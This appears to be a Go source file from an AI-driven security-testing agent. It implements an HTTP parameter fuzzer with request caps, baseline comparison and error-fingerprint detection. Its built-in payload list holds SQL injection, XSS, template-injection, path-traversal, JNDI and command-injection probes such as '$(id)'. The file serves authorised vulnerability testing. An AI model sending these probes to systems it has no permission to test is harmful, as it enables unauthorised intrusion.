package agent

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	actool "github.com/Autumn-27/norma/tool"
)

// 参数位点爆破：同一个请求，只换一处载荷，比响应差异。
//
// 这条是允许的：爆破的是"已经发现的参数位点"，请求量有硬上限（见 fuzzMaxRequests），
// 不是目录字典、也不是 nuclei 那种模板并发硬撞——那两类仍然禁用。
//
// 判定用三重证据，任一成立才报：报错指纹、回显反射、时间盲注（仅对含 sleep 的载荷）。

const (
	fuzzMaxRequests  = 200
	fuzzDefaultReqs  = 60
	fuzzConcurrency  = 8
	fuzzDefaultTime  = 15 * time.Second
	fuzzMaxBodyBytes = 256 << 10
	fuzzBlindDelta   = 3 * time.Second
)

// defaultFuzzPayloads 只放"能立刻分辨真假"的少量载荷，不做字典轰炸。
var defaultFuzzPayloads = []string{
	"'",
	"\"",
	"'--",
	"' OR '1'='1",
	"1' AND '1'='2",
	"1 AND SLEEP(3)",
	"1';WAITFOR DELAY '0:0:3'--",
	"\" OR \"1\"=\"1",
	"<script>alert(1)</script>",
	"<img src=x onerror=alert(1)>",
	"${7*7}",
	"{{7*7}}",
	"#{7*7}",
	"../../../../etc/passwd",
	"..%2f..%2f..%2fetc%2fpasswd",
	"%00",
	"${jndi:ldap://127.0.0.1:1389/a}",
	"|id",
	"`id`",
	"$(id)",
}

var (
	reSQLish = regexp.MustCompile(`(?i)(you have an error in your sql syntax|SQLSTATE|ORA-\d{4,5}|PG::SyntaxError|Microsoft OLE DB Provider|Unclosed quotation mark|mysql_fetch|pg_query|SQLite3::)`)
	reStackish = regexp.MustCompile(`(?i)(Traceback \(most recent call last\)|at java\.|\.java:\d+\)|Warning: \w+\(\) expects parameter|Notice: Undefined|Fatal error:)`)
	reReflect7 = regexp.MustCompile(`(?:^|[^\d])49(?:[^\d]|$)`)
)

type fuzzCase struct {
	Payload  string
	Status   int
	Length   int
	Millis   int64
	Reflect  bool
	SQLError string
	Error    string
}

func (t *ToolSet) httpFuzz() actool.CoreTool {
	return readTool("http_fuzz", "对已经发现的参数位点做载荷爆破：固定其余参数，只替换指定参数的值，逐个载荷比对状态码/长度/报错指纹/回显反射/时间延迟，报差异。默认载荷是一小组高区分度 probe（SQLi/SSTI/命令注入/路径穿越），也可自带载荷。请求量硬上限 200。不做目录爆破、不跑 nuclei 模板。",
		obj(map[string]any{
			"url":         str("完整 URL，参数已带好，例如 https://x.com/item?id=1&cat=2"),
			"param":       str("要爆破的参数名，例如 id"),
			"location":    icpEnum("载荷放哪：query（默认）、body、header", []string{"query", "body", "header"}),
			"header":      str("location=header 时用，填头名，例如 X-Forwarded-For"),
			"payloads":    map[string]any{"type": "array", "items": map[string]any{"type": "string"}, "description": "自带载荷列表；不给就用内置 probe 集"},
			"method":      icpEnum("GET（默认，用于 query）或 POST（用于 body）", []string{"GET", "POST"}),
			"concurrency": map[string]any{"type": "integer", "description": "并发，默认 4，上限 8"},
			"timeout_seconds": map[string]any{"type": "integer", "description": "单请求超时秒数，默认 15，上限 60"},
			"limit":       map[string]any{"type": "integer", "description": "最多发多少个载荷，默认 60，上限 200"},
		}, "url", "param"), func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			var a struct {
				URL        string   `json:"url"`
				Param      string   `json:"param"`
				Location   string   `json:"location"`
				Header     string   `json:"header"`
				Payloads   []string `json:"payloads"`
				Method     string   `json:"method"`
				Concurrency int     `json:"concurrency"`
				TimeoutSec int      `json:"timeout_seconds"`
				Limit      int      `json:"limit"`
			}
			if err := json.Unmarshal(in, &a); err != nil {
				return actool.Errorf(fmt.Sprintf("参数解析失败: %v", err)), nil
			}
			base, err := url.Parse(strings.TrimSpace(a.URL))
			if err != nil || base.Host == "" {
				return actool.Errorf("url 无效：需要带参数的完整 URL"), nil
			}
			param := strings.TrimSpace(a.Param)
			if param == "" {
				return actool.Errorf("param 必填：要爆破的参数名"), nil
			}
			loc := strings.ToLower(strings.TrimSpace(a.Location))
			if loc == "" {
				loc = "query"
			}
			method := strings.ToUpper(strings.TrimSpace(a.Method))
			if method == "" {
				method = "GET"
			}
			limit := a.Limit
			if limit <= 0 || limit > fuzzMaxRequests {
				limit = fuzzDefaultReqs
			}
			conc := a.Concurrency
			if conc <= 0 || conc > fuzzConcurrency {
				conc = 4
			}
			timeout := time.Duration(a.TimeoutSec) * time.Second
			if timeout <= 0 || timeout > 60*time.Second {
				timeout = fuzzDefaultTime
			}
			payloads := a.Payloads
			if len(payloads) == 0 {
				payloads = defaultFuzzPayloads
			}
			if len(payloads) > limit {
				payloads = payloads[:limit]
			}
			client, cerr := t.httpClient(int(timeout.Seconds()), false)
			if cerr != nil {
				return actool.Errorf(fmt.Sprintf("HTTP 客户端不可用：%v", cerr)), nil
			}

			// 基线：原值不换，先拿到干净响应做对照。
			baseline, err := fuzzOnce(ctx, client, method, base, loc, param, a.Header, fuzzBaselineValue(base, param))
			if err != nil {
				return actool.Errorf(fmt.Sprintf("基线请求失败：%v", err)), nil
			}

			results := make([]fuzzCase, len(payloads))
			sem := make(chan struct{}, conc)
			var wg sync.WaitGroup
			for i, p := range payloads {
				wg.Add(1)
				go func(i int, p string) {
					defer wg.Done()
					sem <- struct{}{}
					defer func() { <-sem }()
					c, err := fuzzOnce(ctx, client, method, base, loc, param, a.Header, p)
					if err != nil {
						results[i] = fuzzCase{Payload: p, Error: err.Error()}
						return
					}
					c.Payload = p
					results[i] = c
				}(i, p)
			}
			wg.Wait()

			var b strings.Builder
			fmt.Fprintf(&b, "目标: %s\n参数: %s (%s), 基线 %d %dB %dms, 载荷 %d 个, 并发 %d\n\n",
				sanitizeURL(base.String()), param, loc, baseline.Status, baseline.Length, baseline.Millis, len(payloads), conc)
			anomalies := 0
			shown := 0
			for _, c := range results {
				if c.Error != "" {
					fmt.Fprintf(&b, "  %-28s ERR %s\n", truncate(c.Payload, 26), truncate(c.Error, 90))
					continue
				}
				flags := fuzzFlags(baseline, c)
				if len(flags) > 0 {
					anomalies++
					fmt.Fprintf(&b, "[!] %-26s %d %dB %dms  ← %s\n", truncate(c.Payload, 26), c.Status, c.Length, c.Millis, strings.Join(flags, " / "))
				} else if shown < 8 {
					shown++
					fmt.Fprintf(&b, "    %-26s %d %dB %dms\n", truncate(c.Payload, 26), c.Status, c.Length, c.Millis)
				}
			}
			fmt.Fprintf(&b, "\n差异命中: %d / %d\n", anomalies, len(payloads))
			if anomalies == 0 {
				b.WriteString("无可复现差异：这批载荷没有打出声/色/时差。换参数位点，或按已知技术栈挑针对性载荷再来。\n")
			} else {
				b.WriteString("下一步：对命中的载荷复跑 2 次确认可复现，再把原始请求/响应写入 http_request 取证，然后 report_finding 带 evidence。\n")
			}
			return actool.Text(b.String()), nil
		})
}

func fuzzBaselineValue(base *url.URL, param string) string {
	if v := base.Query().Get(param); v != "" {
		return v
	}
	return "1"
}

func fuzzOnce(ctx context.Context, client *http.Client, method string, base *url.URL, loc, param, header, value string) (fuzzCase, error) {
	u := *base
	req, err := newFuzzRequest(method, &u, loc, param, header, value)
	if err != nil {
		return fuzzCase{}, err
	}
	start := time.Now()
	resp, err := client.Do(req.WithContext(ctx))
	if err != nil {
		return fuzzCase{}, err
	}
	defer resp.Body.Close()
	raw, _ := io.ReadAll(io.LimitReader(resp.Body, fuzzMaxBodyBytes))
	text := string(raw)
	c := fuzzCase{Status: resp.StatusCode, Length: len(raw), Millis: time.Since(start).Milliseconds()}
	if loc != "header" {
		c.Reflect = strings.Contains(text, value) && len(value) > 2
	}
	if m := reSQLish.FindString(text); m != "" {
		c.SQLError = m
	} else if m := reStackish.FindString(text); m != "" {
		c.SQLError = m
	}
	return c, nil
}

func newFuzzRequest(method string, u *url.URL, loc, param, header, value string) (*http.Request, error) {
	switch loc {
	case "query":
		q := u.Query()
		q.Set(param, value)
		u.RawQuery = q.Encode()
		return newRequest(method, u.String(), nil)
	case "body":
		form := url.Values{}
		for k, vs := range u.Query() {
			if len(vs) > 0 && k != param {
				form.Set(k, vs[0])
			}
		}
		form.Set(param, value)
		u.RawQuery = ""
		req, err := newRequest("POST", u.String(), strings.NewReader(form.Encode()))
		if err != nil {
			return nil, err
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		return req, nil
	case "header":
		req, err := newRequest(method, u.String(), nil)
		if err != nil {
			return nil, err
		}
		name := header
		if name == "" {
			name = param
		}
		req.Header.Set(name, value)
		return req, nil
	}
	return nil, fmt.Errorf("location 只能是 query/body/header")
}

func newRequest(method, rawURL string, body io.Reader) (*http.Request, error) {
	req, err := http.NewRequest(method, rawURL, body)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; ARTEX)")
	return req, nil
}

// fuzzFlags reports only differences that mean something: a different status,
// a big length shift, a database/stack error, verbatim reflection, or a delay
// long enough to be server-side sleep.
func fuzzFlags(baseline, c fuzzCase) []string {
	var flags []string
	if c.Status != baseline.Status && (c.Status >= 500 || c.Status == 403 || c.Status == 200 && baseline.Status >= 400) {
		flags = append(flags, fmt.Sprintf("status %d→%d", baseline.Status, c.Status))
	}
	if baseline.Length > 0 {
		delta := c.Length - baseline.Length
		if delta < 0 {
			delta = -delta
		}
		ratio := float64(delta) / float64(baseline.Length)
		if ratio > 0.3 && delta > 120 {
			flags = append(flags, fmt.Sprintf("len %d→%d", baseline.Length, c.Length))
		}
	}
	if c.SQLError != "" && baseline.SQLError == "" {
		flags = append(flags, "报错指纹: "+truncate(c.SQLError, 48))
	}
	if c.Reflect && !baseline.Reflect && reReflect7.MatchString(c.Payload) {
		flags = append(flags, "回显 + 49（表达式求值）")
	} else if c.Reflect && !baseline.Reflect {
		flags = append(flags, "回显反射")
	}
	if d := c.Millis - baseline.Millis; d > fuzzBlindDelta.Milliseconds() && strings.Contains(strings.ToLower(c.Payload), "sleep") ||
		(c.Millis-baseline.Millis) > 5000 && strings.Contains(strings.ToUpper(c.Payload), "WAITFOR") {
		flags = append(flags, fmt.Sprintf("时差 +%dms", c.Millis-baseline.Millis))
	}
	return flags
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}

// sanitizeURL keeps secrets out of the transcript: password-ish query values are masked.
func sanitizeURL(raw string) string {
	u, err := url.Parse(raw)
	if err != nil {
		return raw
	}
	q := u.Query()
	for k := range q {
		lk := strings.ToLower(k)
		if strings.Contains(lk, "token") || strings.Contains(lk, "key") || strings.Contains(lk, "pass") || strings.Contains(lk, "secret") {
			q.Set(k, "***")
		}
	}
	u.RawQuery = q.Encode()
	return u.String()
}
